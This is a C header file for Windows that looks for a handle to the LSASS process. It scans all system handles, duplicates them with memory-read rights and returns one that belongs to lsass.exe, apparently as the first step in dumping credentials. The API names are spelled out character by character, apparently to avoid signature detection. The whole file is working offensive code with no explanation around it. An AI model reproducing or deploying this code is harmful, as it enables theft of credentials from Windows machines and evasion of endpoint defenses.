#pragma once
#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#define NT_SUCCESS(x) ((x) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

#define SystemHandleInformation 16
#define ObjectBasicInformation 0
#define ObjectNameInformation 1
#define ObjectTypeInformation 2

typedef HANDLE(NTAPI* _NtOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
    );

typedef NTSTATUS(NTAPI* _NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );
typedef NTSTATUS(NTAPI* _NtDuplicateObject)(
    HANDLE SourceProcessHandle,
    HANDLE SourceHandle,
    HANDLE TargetProcessHandle,
    PHANDLE TargetHandle,
    ACCESS_MASK DesiredAccess,
    ULONG Attributes,
    ULONG Options
    );
typedef NTSTATUS(NTAPI* _NtQueryObject)(
    HANDLE ObjectHandle,
    ULONG ObjectInformationClass,
    PVOID ObjectInformation,
    ULONG ObjectInformationLength,
    PULONG ReturnLength
    );

typedef BOOL(NTAPI* _NtQueryFullProcessImageNameW)(
    HANDLE hProcess,
    DWORD  dwFlags,
    LPWSTR lpExeName,
    PDWORD lpdwSize
    );

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _SYSTEM_HANDLE {
    ULONG ProcessId;
    BYTE ObjectTypeNumber;
    BYTE Flags;
    USHORT Handle;
    PVOID Object;
    ACCESS_MASK GrantedAccess;
} SYSTEM_HANDLE, * PSYSTEM_HANDLE;

typedef struct _SYSTEM_HANDLE_INFORMATION {
    ULONG HandleCount;
    SYSTEM_HANDLE Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

typedef enum _POOL_TYPE {
    NonPagedPool,
    PagedPool,
    NonPagedPoolMustSucceed,
    DontUseThisType,
    NonPagedPoolCacheAligned,
    PagedPoolCacheAligned,
    NonPagedPoolCacheAlignedMustS
} POOL_TYPE, * PPOOL_TYPE;

typedef struct _OBJECT_TYPE_INFORMATION {
    UNICODE_STRING Name;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccess;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    USHORT MaintainTypeList;
    POOL_TYPE PoolType;
    ULONG PagedPoolUsage;
    ULONG NonPagedPoolUsage;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

PVOID GetLibraryProcAddress(const char* LibraryName, const char* ProcName) {
    return GetProcAddress(GetModuleHandleA(LibraryName), ProcName);
}

HANDLE enum_lsass_handles() {
    char ntdll[] = { 'n','t','d','l','l','.','d','l','l',0 };
    char kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
    char qsysinfo[] = { 'N','t','Q','u','e','r','y','S','y','s','t','e','m','I','n','f','o','r','m','a','t','i','o','n',0 };
    char dupo[] = { 'N','t','D','u','p','l','i','c','a','t','e','O','b','j','e','c','t',0 };
    char qo[] = { 'N','t','Q','u','e','r','y','O','b','j','e','c','t',0 };
    char qfpi[] = { 'Q','u','e','r','y','F','u','l','l','P','r','o','c','e','s','s','I','m','a','g','e','N','a','m','e','W',0 };
    char op[] = { 'O','p','e','n','P','r','o','c','e','s','s',0 };

    _NtQuerySystemInformation ffNtQuery_SystemInformation = (_NtQuerySystemInformation)GetLibraryProcAddress(ntdll, qsysinfo);
    _NtDuplicateObject ffNtDuplicate_Object = (_NtDuplicateObject)GetLibraryProcAddress(ntdll, dupo);
    _NtQueryObject ffNtQuery_Object = (_NtQueryObject)GetLibraryProcAddress(ntdll, qo);
    _NtQueryFullProcessImageNameW ffNtQuery_FullProcessImageNameW = (_NtQueryFullProcessImageNameW)GetLibraryProcAddress(kernel32, qfpi);
    _NtOpenProcess ffNtOpen_Process = (_NtOpenProcess)GetLibraryProcAddress(kernel32, op);

    NTSTATUS status;
    PSYSTEM_HANDLE_INFORMATION handleInfo;
    ULONG handleInfoSize = 0x10000;
    ULONG pid;
    HANDLE processHandle;
    ULONG i;
    HANDLE lsass_handles = NULL;

    handleInfo = (PSYSTEM_HANDLE_INFORMATION)malloc(handleInfoSize);

    // NtQuerySystemInformation won't give us the correct buffer size,
    //  so we guess by doubling the buffer size.
    while ((status = ffNtQuery_SystemInformation(
        SystemHandleInformation,
        handleInfo,
        handleInfoSize,
        NULL
    )) == STATUS_INFO_LENGTH_MISMATCH)
        handleInfo = (PSYSTEM_HANDLE_INFORMATION)realloc(handleInfo, handleInfoSize *= 2);

    // NtQuerySystemInformation stopped giving us STATUS_INFO_LENGTH_MISMATCH.
    if (!NT_SUCCESS(status)) {
        printf("NtQuerySystemInformation failed!\n");
        HANDLE tmp = NULL;
        return tmp;
    }

    for (i = 0; i < handleInfo->HandleCount; i++) {
        SYSTEM_HANDLE handle = handleInfo->Handles[i];
        HANDLE dupHandle = NULL;
        POBJECT_TYPE_INFORMATION objectTypeInfo;
        PVOID objectNameInfo;
        UNICODE_STRING objectName;
        ULONG returnLength;

        // Check if PID belongs to System
        if (handle.ProcessId == 4)
            continue;

        processHandle = ffNtOpen_Process(PROCESS_DUP_HANDLE, FALSE, handle.ProcessId);

        // Duplicate the handle so we can query it.
        if (!NT_SUCCESS(ffNtDuplicate_Object(
            processHandle,
            (void*)handle.Handle,
            GetCurrentProcess(),
            &dupHandle,
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            0,
            0
        ))) {
            continue;
        }


        // Query the object type.
        objectTypeInfo = (POBJECT_TYPE_INFORMATION)malloc(0x1000);
        if (!NT_SUCCESS(ffNtQuery_Object(
            dupHandle,
            ObjectTypeInformation,
            objectTypeInfo,
            0x1000,
            NULL
        ))) {
            continue;
        }

        UNICODE_STRING objectType = *(PUNICODE_STRING)objectTypeInfo;

        wchar_t path[MAX_PATH];
        DWORD maxPath = MAX_PATH;

        if (wcsstr(objectType.Buffer, L"Process") != NULL)
        {
            // Print handle, type and its PID
            ffNtQuery_FullProcessImageNameW(dupHandle, 0, path, &maxPath);
            if (wcsstr(path, L"lsass.exe") != NULL) {
                lsass_handles = dupHandle;
                break;
            }
        }
        free(objectTypeInfo);
    }
    free(handleInfo);

    return lsass_handles;
}